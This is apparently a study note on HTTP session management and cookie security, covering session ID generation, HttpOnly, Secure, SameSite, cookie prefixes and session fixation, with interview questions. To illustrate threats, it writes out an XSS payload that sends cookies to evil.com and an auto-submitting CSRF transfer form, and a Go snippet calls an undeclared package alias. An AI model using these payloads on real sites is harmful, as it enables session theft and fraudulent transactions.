---
title: "HTTP Sessions, Cookies & Cookie Security: Session IDs, HttpOnly, Secure, SameSite, and Defense in Depth"
---

## Why Sessions Exist

HTTP is **stateless** — every request is independent. The server has no built-in mechanism to correlate request #2 with request #1 from the same user. But web applications need state: "this user is logged in," "this is their shopping cart," "they have admin privileges."

The solution: after authentication, the server creates a **session** — a chunk of server-side state tied to a unique identifier (the **session ID**). The client receives only the session ID and presents it on every subsequent request. It works exactly like a coat-check ticket: the valuable item (session data) stays with the venue (server), and the client holds only a claim ticket (session ID).

This is defined by the broader HTTP state management mechanism in **RFC 6265** (HTTP State Management Mechanism), which standardizes how cookies carry this state between client and server.

---

## Session ID Lifecycle

```
Client                                              Server
  |                                                    |
  |  1. POST /login  {username, password}              |
  |--------------------------------------------------->|
  |                                 2. Validate creds  |
  |                                 3. Generate session |
  |                                    ID via CSPRNG   |
  |                                 4. Store session in |
  |                                    session store   |
  |                                    (Redis/DB/mem)  |
  |                                                    |
  |  5. HTTP 200                                       |
  |     Set-Cookie: __Host-sid=Kj8mP2x..;             |
  |       Path=/; Secure; HttpOnly; SameSite=Lax;      |
  |       Max-Age=3600                                 |
  |<---------------------------------------------------|
  |                                                    |
  |  6. GET /dashboard                                 |
  |     Cookie: __Host-sid=Kj8mP2x..                   |
  |--------------------------------------------------->|
  |                                 7. Lookup sid in    |
  |                                    session store   |
  |                                 8. Found → identify |
  |                                    user, serve page|
  |                                                    |
  |  9. HTTP 200 (dashboard HTML)                      |
  |<---------------------------------------------------|
  |                                                    |
  |  ---- later ----                                   |
  |                                                    |
  |  10. POST /logout                                  |
  |      Cookie: __Host-sid=Kj8mP2x..                  |
  |--------------------------------------------------->|
  |                                11. Delete session   |
  |                                    from store      |
  |  12. Set-Cookie: __Host-sid=; Max-Age=0            |
  |<---------------------------------------------------|
```

### Step-by-step breakdown

**Steps 1-2 — Authentication trigger.** The user submits credentials. The server validates them (comparing a bcrypt/argon2 hash of the password against the stored hash, verifying an OAuth token, etc.). Session creation only happens after successful verification. Some applications also create anonymous sessions (e.g., for guest shopping carts), but security-critical sessions are always post-authentication.

**Step 3 — Session ID generation.** This is where security lives or dies. The session ID must be:
- **Unpredictable** — an attacker must not be able to guess a valid ID
- **Unique** — no two active sessions share an ID
- **Sufficiently long** — to resist brute-force enumeration

The server uses a **CSPRNG** (Cryptographically Secure Pseudo-Random Number Generator). A regular PRNG like `Math.random()` in JavaScript or `rand()` in C is **not safe** — its output can be predicted if an attacker observes enough values.

CSPRNGs draw entropy from the OS entropy pool:
- Linux: `/dev/urandom` (collects hardware randomness from disk I/O timings, network packet arrival times, CPU jitter, keyboard/mouse input)
- Windows: `CryptGenRandom` / `BCryptGenRandom`
- macOS: `/dev/urandom` backed by Fortuna CSPRNG

```python
# Python — uses os.urandom() internally
import os
session_id = os.urandom(32).hex()
# → "a3f1b9c8e7d6054f..."  (64 hex chars = 256 bits)
```

```go
// Go — crypto/rand reads from OS CSPRNG
import "crypto/rand"
import "encoding/base64"

b := make([]byte, 32)
crypto_rand.Read(b)
sessionID := base64.URLEncoding.EncodeToString(b)
```

```javascript
// Node.js
const crypto = require('crypto');
const sessionId = crypto.randomBytes(32).toString('hex');
```

> **Note:** OWASP recommends a minimum of **128 bits of entropy** for session IDs (OWASP Session Management Cheat Sheet). At 128 bits, an attacker trying 1 billion guesses per second would need ~10^22 years for a 50% chance of a collision. Most frameworks generate 128–256 bits. Some frameworks additionally hash the random bytes (e.g., SHA-256), but this does not add entropy — it is a normalization step to produce a fixed-length hex string.

**Step 4 — Server-side session storage.** The server stores a mapping: `session_id → session_data`. The session data typically includes `user_id`, `role`, `created_at`, `last_accessed`, and sometimes the client's IP for binding.

| Storage Backend | Characteristics | Trade-offs |
|---|---|---|
| **In-memory** (HashMap in the app process) | Fastest, simplest | Lost on restart; cannot share across multiple instances behind a load balancer |
| **Relational DB** (PostgreSQL, MySQL) | Persistent, queryable, familiar | Slower (disk I/O on every request); adds DB load |
| **Redis / Memcached** | Very fast (in-memory but external), native TTL support, shared across instances | Extra infrastructure; data loss if Redis restarts without persistence (RDB/AOF) |
| **Signed cookies** (session data *in* the cookie) | No server-side storage needed; stateless | 4KB cookie size limit; cannot revoke individual sessions without a server-side blacklist |

The most common production setup is **Redis** — it gives speed, shared state across app servers (critical behind load balancers), and built-in key expiration:

```
Redis key:   "session:a3f1b9c8e7d6054f..."
Redis value: {"user_id": 42, "role": "admin", "created_at": 1712750000}
Redis TTL:   3600  (auto-expires in 1 hour)
```

**Step 5 — Cookie delivery.** The server sends the session ID via the `Set-Cookie` response header. The browser stores it in its cookie jar. The flags on this cookie (`HttpOnly`, `Secure`, `SameSite`, etc.) are the security mechanisms covered in the later sections.

**Steps 6-8 — Subsequent requests.** On every request to the same origin, the browser **automatically** attaches the cookie in the `Cookie` header. The server extracts the session ID, looks it up in the store, and if valid, attaches the user's identity to the request context.

**Steps 10-12 — Session termination.** Sessions end by:
- **Expiry**: server-side TTL elapses (Redis auto-deletes the key), or the cookie's `Max-Age` expires (browser deletes the cookie)
- **Explicit logout**: server deletes the session from the store and tells the browser to clear the cookie (`Max-Age=0`)
- **Revocation**: an admin or security system deletes the session key server-side — the next request with that ID gets rejected

This is a major advantage of server-side sessions over JWTs: **instant revocation**. Delete the key from Redis and the session is gone. With JWTs, the token remains valid until it expires (unless you maintain a server-side revocation list, which defeats much of the stateless benefit).

---

## Cookies: The Transport Mechanism

Cookies are defined in **RFC 6265** (and its successor **RFC 6265bis** which adds `SameSite` and cookie prefixes). A cookie is a small piece of data (max ~4KB) that the server asks the browser to store and send back on subsequent requests.

### How Cookies Work at the HTTP Level

```
Server → Client (response):
  HTTP/1.1 200 OK
  Set-Cookie: sid=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
  Set-Cookie: theme=dark; Path=/; Max-Age=86400

Client → Server (subsequent request):
  GET /dashboard HTTP/1.1
  Host: example.com
  Cookie: sid=abc123; theme=dark
```

The browser decides which cookies to send based on:
- **Domain**: the cookie's domain must match or be a parent of the request's domain
- **Path**: the request path must start with the cookie's path
- **Secure**: if set, only sent over HTTPS
- **SameSite**: cross-site sending rules (covered below)
- **Expiry**: expired cookies are not sent and are deleted from the jar

### Cookie Scope and Domain Rules

| `Set-Cookie` | Sent to `example.com`? | Sent to `sub.example.com`? | Sent to `other.com`? |
|---|---|---|---|
| `Domain=example.com` | Yes | Yes (includes subdomains) | No |
| No `Domain` attribute | Yes | **No** (exact origin only) | No |

> **Note:** Omitting `Domain` is actually **more restrictive** than setting it — the cookie is locked to the exact origin. This is why the `__Host-` prefix requires no `Domain` attribute.

---

## Cookie Security Attributes (Defense in Depth)

Auth cookies are protected through **defense in depth** — multiple independent security mechanisms, each covering a different attack vector. No single attribute is sufficient.

```
┌──────────────────────────────────────────────────────────────────┐
│                     Auth Cookie Security Layers                  │
├──────────────┬───────────────────────────────────────────────────┤
│  Attribute   │  Threat it mitigates                              │
├──────────────┼───────────────────────────────────────────────────┤
│  HttpOnly    │  XSS-based cookie theft (JS can't read it)       │
│  Secure      │  Network eavesdropping (only sent over HTTPS)    │
│  SameSite    │  CSRF (controls cross-site cookie sending)       │
│  __Host-     │  Subdomain cookie overwrite attacks              │
│  Max-Age/TTL │  Limits exposure window of stolen sessions       │
│  Signing     │  Cookie tampering / privilege escalation         │
│  Rotation    │  Session fixation attacks                        │
└──────────────┴───────────────────────────────────────────────────┘
```

### HttpOnly (RFC 6265, Section 5.2.6)

The `HttpOnly` attribute instructs the browser to **omit the cookie when providing access to cookies via non-HTTP APIs** — specifically, `document.cookie` in JavaScript.

```
Set-Cookie: sid=abc123; HttpOnly
```

**What happens:**

```javascript
// In the browser console on example.com:
document.cookie
// → "theme=dark"          ← HttpOnly cookies are EXCLUDED
// The sid cookie is invisible to JS but still sent in HTTP headers
```

The enforcement is at the **browser engine level** (Blink, Gecko, WebKit), not in JavaScript. Even `fetch()` and `XMLHttpRequest` cannot read `Set-Cookie` headers from responses — the browser strips them from the response object exposed to JS.

**The attack it prevents — XSS cookie exfiltration:**

```
                         WITHOUT HttpOnly
                         ────────────────
  1. Attacker finds XSS on example.com
     (unsanitized input rendered as HTML)

  2. Injects payload:
     <script>
       fetch("https://evil.com/steal?c=" + document.cookie)
     </script>

  3. Victim visits page → browser executes script in
     example.com's origin → document.cookie returns
     "sid=a3f1b9c8e7d6..."

  4. Session ID exfiltrated to attacker's server

  5. Attacker sets cookie in their browser → SESSION HIJACKED

                         WITH HttpOnly
                         ─────────────
  Step 3 fails → document.cookie does NOT include
  the session cookie → nothing to exfiltrate
```

**What HttpOnly does NOT protect against:**

- **XSS itself.** The attacker's script still executes. They can still modify the page, make authenticated API calls (the browser attaches the cookie automatically), read DOM content, redirect the user — they just cannot exfiltrate the raw cookie value.
- **Network sniffing** — that's `Secure`'s job
- **CSRF** — that's `SameSite`'s job

### Secure (RFC 6265, Section 5.2.5)

The `Secure` attribute tells the browser: **only send this cookie over HTTPS, never over plain HTTP.**

```
Set-Cookie: sid=abc123; Secure
```

```
WITHOUT Secure:
  Browser ─── HTTP (plaintext) ───> Server
                Cookie: sid=abc123
                ^^^^^^^^^^^^^^^^^^
                Visible to anyone on the network
                (Wi-Fi sniffing, ISP, MITM proxies)

WITH Secure:
  Browser ─── HTTP ───> Server     (cookie withheld)
  Browser ─── HTTPS ──> Server     Cookie: sid=abc123
                                   (encrypted in TLS tunnel)
```

> **Note:** RFC 6265 Section 5.2.5 explicitly warns: "The Secure attribute protects only the cookie's confidentiality. An active network attacker can overwrite Secure cookies from an insecure channel." This is one reason cookie prefixes (`__Host-`, `__Secure-`) were introduced — they add additional constraints.

### SameSite (RFC 6265bis)

The `SameSite` attribute controls **when the browser sends the cookie on cross-site requests**. It is the primary defense against CSRF (Cross-Site Request Forgery).

**What is CSRF?**

CSRF is an attack where a malicious site tricks the user's browser into making an authenticated request to a target site. Because the browser automatically attaches cookies, the request looks legitimate to the server.

```
                         CSRF Attack Flow
                         ────────────────

  1. User logs into bank.com → browser has session cookie

  2. User visits evil.com (different tab, clicked a link, etc.)

  3. evil.com contains:
     <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="10000">
     </form>
     <script>document.forms[0].submit();</script>

  4. Browser sends POST to bank.com
     WITH the session cookie (auto-attached)
     ┌──────────────────────────────────┐
     │ POST /transfer HTTP/1.1          │
     │ Host: bank.com                   │
     │ Cookie: sid=abc123               │  ← browser attached this!
     │ Content-Type: application/x-www  │
     │                                  │
     │ to=attacker&amount=10000         │
     └──────────────────────────────────┘

  5. bank.com sees valid session cookie → processes transfer
```

**SameSite values:**

| Value | Behavior | CSRF Protection |
|---|---|---|
| `Strict` | Cookie **never** sent on cross-site requests — only when user navigates directly on the site | Full CSRF protection, but breaks legitimate flows (e.g., clicking a link from email to a logged-in page — user appears logged out) |
| `Lax` | Cookie sent on cross-site **top-level GET navigations**, but **not** on cross-site POST, iframe, AJAX, or image requests | Blocks CSRF POSTs; allows following links from external sites |
| `None` | Cookie always sent cross-site (old behavior). **Requires `Secure` flag** or browsers reject it | No CSRF protection from this attribute |

**`Lax` is the default in modern browsers** (Chrome since 2020, Firefox since 2022). This was a huge security improvement — even sites that never explicitly set `SameSite` get baseline CSRF protection.

```
SameSite=Lax behavior when user is logged into bank.com
and evil.com tries cross-site requests:

Request from evil.com                                 Cookie sent?
─────────────────────────────────────────────────────────────────────
<a href="https://bank.com/dashboard">                  YES (top-level GET nav)
<form method="GET" action="bank.com/search">           YES (top-level GET nav)
<form method="POST" action="bank.com/transfer">        NO  ← CSRF blocked
<img src="https://bank.com/api/data">                  NO
<iframe src="https://bank.com/settings">               NO
<script>fetch("https://bank.com/api/data")</script>    NO
<link rel="prerender" href="bank.com/page">            NO
```

> **Note:** `SameSite=Lax` still allows GET-based CSRF. If your application performs state-changing operations on GET requests (which violates HTTP semantics — GET should be safe/idempotent per RFC 7231), `Lax` will not protect you. This is why state-changing operations must use POST/PUT/DELETE.

### Cookie Prefixes (`__Host-` and `__Secure-`)

Defined in **RFC 6265bis**, cookie prefixes are a naming convention that browsers enforce with additional constraints.

**The problem they solve:** A compromised subdomain (e.g., `evil.sub.example.com` via subdomain takeover or shared hosting) can set a cookie for the parent domain `example.com`, potentially overwriting the legitimate session cookie with an attacker-controlled value.

**`__Host-` prefix** (the stricter option):

The browser **rejects** the cookie unless ALL of these are true:
- `Secure` flag is set
- No `Domain` attribute (locked to exact origin)
- `Path=/`
- Set from a secure origin (HTTPS)

```
Set-Cookie: __Host-sid=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

This prevents:
- Subdomains from overwriting the cookie (no `Domain` attribute → exact origin only)
- Insecure origins from setting it
- Path-scoping attacks

**`__Secure-` prefix** (less strict):

The browser rejects the cookie unless:
- `Secure` flag is set
- Set from a secure origin

```
Set-Cookie: __Secure-sid=abc123; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax
```

Use `__Secure-` when you need the cookie accessible across subdomains (e.g., `app.example.com` and `api.example.com`) but still want protection against insecure origins setting it.

---

## Cookie Signing and Encryption

When session data is stored **inside the cookie** (rather than just a session ID pointing to server-side storage), the data must be tamper-proof and optionally confidential.

### Signing (HMAC)

The server computes an HMAC (Hash-based Message Authentication Code) over the cookie value using a server-side secret key. The HMAC is appended to the cookie. On the next request, the server recomputes the HMAC and compares.

```
Cookie construction (server-side):

  data      = base64({"user_id": 42, "role": "admin"})
  signature = HMAC-SHA256(secret_key, data)
  cookie    = data + "." + signature

  Set-Cookie: session=eyJ1c2VyX2lkIjo0Mn0.hK9d8Fw2xQ3vB7...

Tampering attempt:

  Attacker changes "admin" → "superadmin" in the data portion
  Attacker cannot compute a valid HMAC without the secret_key
  Server recomputes HMAC → mismatch → REJECTS the cookie
```

### Encryption (AES-GCM)

Encryption goes further — the cookie contents are encrypted with a symmetric cipher (AES-256-GCM is typical), so the client cannot even **read** the data inside. This prevents information leakage (the client doesn't know their internal role ID, user ID, or any server-side state).

```
  Signing only:     client can READ data, cannot MODIFY it
  Signing + Encrypt: client cannot READ or MODIFY data
```

Frameworks that use cookie-based sessions:
- **Rails**: encrypts + signs by default (AES-256-GCM + HMAC)
- **Flask**: signs but does **not** encrypt by default (base64 + HMAC-SHA1). Use `flask-session` with server-side storage or a library like `itsdangerous` with encryption for sensitive data.
- **Express (cookie-session)**: signs by default, encryption is opt-in

---

## Session Fixation and Session Rotation

### The Attack

Session fixation is an attack where the attacker **sets** a known session ID on the victim's browser *before* the victim logs in.

```
                    Session Fixation Attack
                    ──────────────────────

  Attacker                    Victim                    Server
     |                          |                         |
     |  1. GET /login           |                         |
     |------------------------------------------------------->|
     |                          |          2. Here's an   |
     |  sid=KNOWN_VALUE         |             anon session|
     |<-------------------------------------------------------|
     |                          |                         |
     |  3. Trick victim into    |                         |
     |     using KNOWN_VALUE    |                         |
     |     (via URL, XSS, etc.) |                         |
     |------------------------->|                         |
     |                          |                         |
     |                          |  4. POST /login         |
     |                          |     Cookie: sid=KNOWN   |
     |                          |     {username, password} |
     |                          |------------------------>|
     |                          |                         |
     |                          |     5. Server validates |
     |                          |        creds, upgrades  |
     |                          |        SAME session to  |
     |                          |        authenticated    |
     |                          |        (BUG: no rotate) |
     |                          |                         |
     |  6. Attacker uses        |                         |
     |     sid=KNOWN_VALUE      |                         |
     |------------------------------------------------------->|
     |                          |     7. Valid session →  |
     |                          |        HIJACKED!        |
```

### The Defense: Rotate on Login

**Always regenerate the session ID after authentication.** This is a one-line fix in most frameworks:

```python
# Flask
@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form):
        # Critical: regenerate session ID
        session.regenerate()  # or framework equivalent
        session['user_id'] = user.id
```

```go
// Go with gorilla/sessions
session, _ := store.Get(r, "session")
// After successful auth:
session.Options.MaxAge = -1  // invalidate old
session.Save(r, w)
session, _ = store.New(r, "session")  // create new
session.Values["user_id"] = user.ID
session.Save(r, w)
```

**When to rotate session IDs:**
1. After login (prevents session fixation)
2. After privilege escalation (e.g., entering admin panel, re-authenticating for sensitive action)
3. Periodically during long-lived sessions (limits exposure window)

---

## Additional Server-Side Defenses

### Binding Sessions to Client Properties

Some applications bind the session to the client's IP address or TLS client fingerprint:

```
Session store entry:
  sid:  "a3f1b9c8..."
  data: {user_id: 42, bound_ip: "203.0.113.5", bound_ua: "Mozilla/5.0..."}

On each request:
  if request.ip != session.bound_ip → reject (possible stolen session)
```

**Trade-off:** This breaks for users behind mobile networks (IP changes frequently), corporate proxies, and VPNs. Most applications log the IP change as suspicious activity rather than hard-rejecting.

### CSRF Tokens (Belt-and-Suspenders with SameSite)

Even with `SameSite=Lax`, many applications still use CSRF tokens for defense in depth:

```
Server renders form:
  <form method="POST" action="/transfer">
    <input type="hidden" name="_csrf" value="random_token_abc">
    ...
  </form>

Server validates:
  if request.form["_csrf"] != session["csrf_token"]:
      reject(403)
```

The CSRF token is tied to the session and embedded in the page's HTML. A cross-site attacker cannot read the token (same-origin policy prevents reading the response) and therefore cannot include it in a forged request.

### Content-Security-Policy (CSP)

CSP headers mitigate XSS — the attack that HttpOnly partially defends against:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```

This tells the browser: only execute scripts loaded from the same origin. Inline scripts (the typical XSS payload) are blocked. CSP is the most powerful XSS mitigation alongside output encoding.

---

## The Complete Auth Cookie

Putting every layer together:

```http
Set-Cookie: __Host-sid=Kj8mP2xR9vNqW7bT...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
             │         │                       │       │       │         │             │
             │         │                       │       │       │         │             └─ Expires in 1 hour
             │         │                       │       │       │         └─ Cross-site POST blocked
             │         │                       │       │       └─ JS cannot read this cookie
             │         │                       │       └─ Only sent over HTTPS
             │         │                       └─ Scoped to entire site
             │         └─ 128+ bits of CSPRNG randomness
             └─ __Host- prefix: no subdomain/domain override attacks
```

### Remaining Gaps (What Cookies Cannot Solve)

Even with every attribute set correctly:

| Gap | Why | Actual Defense |
|---|---|---|
| XSS-based actions (not theft) | Attacker's script makes authenticated requests from victim's browser — cookie is auto-attached | Prevent XSS itself: CSP, output encoding, input sanitization |
| Compromised server | Attacker has session store + signing keys | Infrastructure security, key rotation, intrusion detection |
| Physical/local access | Cookies stored on disk (browser's SQLite DB) | Full-disk encryption, OS access controls, screen lock |
| Browser vulnerabilities | Bugs that leak HttpOnly cookies (has happened in older IE versions) | Keep browsers updated |
| Stolen session ID (MITM on first request before HSTS kicks in) | First request to a new domain may be HTTP | HSTS preload list, HSTS header with `includeSubDomains` |

**Bottom line:** Preventing XSS at the application layer (CSP + output encoding + input validation) remains the single most important defense. Cookie attributes are damage-limitation mechanisms, not root-cause fixes.

---

## See Also

- [[notes/AuthNZ/OIDC_Oauth|SSO, SAML, OAuth 2.0, OIDC, JWT & Workload Identity Federation]] — How identity is established before sessions are created
- [[notes/Networking/tls-1.3-handshake|TLS 1.3 Handshake]] — The encryption layer that `Secure` cookies rely on
- [[notes/Networking/https-tcp-tls-flow-content-length-vs-chunked-vs-http2|End-to-End HTTPS Flow]] — Full request lifecycle including TLS negotiation
- [RFC 6265 — HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265) — Original cookie specification
- [RFC 6265bis (draft)](https://datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis/) — Updated spec adding SameSite, cookie prefixes
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: Secure Cookie Configuration](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies)

---

## Interview Prep

### Q: How is a session ID generated and why can't you use `Math.random()`?

**A:** Session IDs are generated using a **CSPRNG** (Cryptographically Secure Pseudo-Random Number Generator) — e.g., `crypto.randomBytes()` in Node, `os.urandom()` in Python, `crypto/rand` in Go. These pull entropy from the OS kernel's entropy pool (hardware events: disk I/O, network timings, CPU jitter).

`Math.random()` (and similar non-crypto PRNGs) use deterministic algorithms seeded with a small initial value. If an attacker observes enough outputs, they can predict future values and guess valid session IDs. CSPRNGs are designed to resist this even with observed outputs.

OWASP mandates a minimum of **128 bits of entropy**. At that level, brute-forcing at 10^9 guesses/sec would take ~10^22 years.

### Q: Walk through what happens when a user logs in, gets a session cookie, and makes subsequent requests — end to end.

**A:**

```
1. User submits POST /login with credentials
2. Server validates (e.g., bcrypt.compare(password, stored_hash))
3. Server generates session ID via CSPRNG (e.g., 32 random bytes → hex)
4. Server stores session in Redis:
     SET "session:a3f1..." '{"user_id":42,"role":"user"}' EX 3600
5. Server responds with:
     Set-Cookie: __Host-sid=a3f1...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
6. Browser stores cookie in its jar (associated with the origin)
7. On next request (GET /dashboard):
     - Browser checks: same origin? HTTPS? not expired? SameSite rules pass?
     - If all yes → attaches Cookie: __Host-sid=a3f1...
8. Server middleware extracts sid from Cookie header
9. Server does Redis GET "session:a3f1..." → gets user_id=42
10. Request handler knows the user → serves personalized response
```

### Q: What is the difference between `SameSite=Strict` and `SameSite=Lax`? When would you choose each?

**A:**

```
                        Strict                              Lax
                        ──────                              ───
Cross-site top-level    Cookie NOT sent                     Cookie IS sent
GET navigation          (user appears logged out            (user stays logged in
(clicking a link        when arriving from                  when clicking links
from external site)     external sites)                     from email/social media)

Cross-site POST         Cookie NOT sent                     Cookie NOT sent
(CSRF attack vector)

Cross-site subresource  Cookie NOT sent                     Cookie NOT sent
(img, iframe, fetch)
```

**Choose `Strict`** for high-security cookies where you never need cross-site navigation to preserve the session (e.g., banking, admin panels). The UX cost is that users clicking links from emails or other sites will need to re-authenticate.

**Choose `Lax`** (the default) for general-purpose session cookies where you want cross-site link navigation to work but still block CSRF POSTs. This is the right choice for most applications.

### Q: If I set `HttpOnly`, can an XSS attacker still do damage?

**A:** Yes, significant damage. `HttpOnly` only prevents the attacker from **reading the raw cookie value** via `document.cookie`. But the attacker's script runs in the victim's browser, in the victim's origin — so:

```
What HttpOnly BLOCKS:
  ✗ document.cookie access → can't steal the session ID
  ✗ Exfiltrating the cookie to an external server

What HttpOnly does NOT block:
  ✓ fetch("/api/transfer", {method: "POST", body: "to=attacker&amount=10000"})
    → browser AUTOMATICALLY attaches the HttpOnly cookie
    → server sees a valid authenticated request
  ✓ Reading page content (DOM, API responses)
  ✓ Modifying the page (phishing, fake login forms)
  ✓ Redirecting the user
  ✓ Keylogging (attaching event listeners to inputs)
```

HttpOnly is damage limitation, not XSS prevention. The real defense is **preventing XSS itself**: Content-Security-Policy, output encoding, input sanitization.

### Q: Explain session fixation and how to prevent it.

**A:** Session fixation is an attack where the attacker **pre-sets** a session ID they know into the victim's browser, then waits for the victim to authenticate with that session.

```
Attack:
  1. Attacker visits site → gets anonymous session sid=KNOWN
  2. Attacker tricks victim into using sid=KNOWN
     (via malicious link, XSS, or meta-tag injection)
  3. Victim logs in with sid=KNOWN → server upgrades session to authenticated
  4. Attacker uses sid=KNOWN → now authenticated as victim

Prevention:
  After successful authentication, ALWAYS:
    old_sid = current session ID
    new_sid = generate_new_CSPRNG_session_id()
    copy session data from old_sid → new_sid
    delete old_sid from session store
    Set-Cookie with new_sid
  
  Now the attacker's KNOWN value points to a deleted session → attack fails
```

### Q: Why is `__Host-` prefix more secure than just setting `Secure; HttpOnly`?

**A:** The `__Host-` prefix defends against **subdomain cookie injection**. Without it:

```
Attack scenario:
  1. attacker.sub.example.com is compromised (subdomain takeover, shared hosting)
  2. Attacker serves:
       Set-Cookie: sid=EVIL_VALUE; Domain=example.com; Path=/
  3. Browser accepts it — subdomains CAN set cookies for parent domains
  4. Victim visits example.com → browser sends sid=EVIL_VALUE
  5. If server accepts this → session fixation via subdomain

With __Host- prefix:
  - Browser enforces: no Domain attribute allowed
  - Cookie is locked to exact origin (example.com only)
  - sub.example.com cannot set a __Host- cookie for example.com
  - Additionally: must have Secure, must have Path=/
```

### Q: Compare server-side sessions vs JWT-based authentication. When would you choose each?

**A:**

```
                    Server-Side Sessions              JWTs (Stateless)
                    ────────────────────              ────────────────
Storage             Server (Redis/DB)                 Client (cookie/localStorage)
Revocation          Instant (delete key)              Hard (need blacklist or short TTL)
Scalability         Need shared session store         Stateless — any server can validate
Size                Cookie: ~32 bytes (just ID)       Cookie: ~500+ bytes (claims + sig)
Replay window       Until server deletes session      Until token expires
Cross-service       Need shared session store         Any service with the public key
                    or session service                can validate independently
Sensitive data      Stored server-side (safe)         In the token (must encrypt or
                                                      avoid putting sensitive data)
```

**Choose server-side sessions** when: you need instant revocation, you have sensitive session data, you have few services sharing auth state, or you are building a traditional web app.

**Choose JWTs** when: you have a microservice architecture where many services need to validate auth independently, you want to avoid a centralized session store, and you can tolerate the revocation trade-off (short TTLs + refresh tokens).

### Q: A security audit flags that your session cookie doesn't have `SameSite`, `__Host-` prefix, or `Secure`. What is the practical impact?

**A:**

```
Missing attribute    Practical impact
────────────────     ─────────────────────────────────────────────────
No SameSite          Modern browsers default to Lax, so POST-based CSRF
                     is blocked. BUT older browsers (pre-2020) treat it
                     as None → full CSRF vulnerability on those browsers.
                     Always set it explicitly.

No Secure            Cookie sent over HTTP too. On any non-HTTPS connection
                     (public Wi-Fi, HTTP redirect before HSTS), the cookie
                     is visible in plaintext → session hijacking via
                     network sniffing.

No __Host-           Subdomains can inject/overwrite the cookie. If ANY
                     subdomain is compromised (subdomain takeover is
                     surprisingly common), the attacker can perform
                     session fixation on the parent domain.
```

All three are one-line fixes. There is no reason not to set them.

### Q: How does HSTS relate to cookie security?

**A:** HSTS (HTTP Strict Transport Security) tells the browser: "for the next N seconds, **always** use HTTPS for this domain — even if the user types `http://`." This closes the gap where the `Secure` flag alone isn't enough:

```
Without HSTS:
  User types http://bank.com → browser sends HTTP request
  → Cookie with Secure flag is NOT sent (good)
  → BUT an active MITM can intercept this first HTTP request
    and inject a fake response before the redirect to HTTPS

With HSTS:
  Browser already knows to use HTTPS → never makes the HTTP request
  → No window for MITM on the first request

With HSTS Preload:
  Domain is hardcoded in the browser's preload list
  → HTTPS enforced from the very first visit, even before
    any HSTS header is received
```

HSTS + `Secure` cookies + `__Host-` prefix is the full chain for transport-level cookie security.
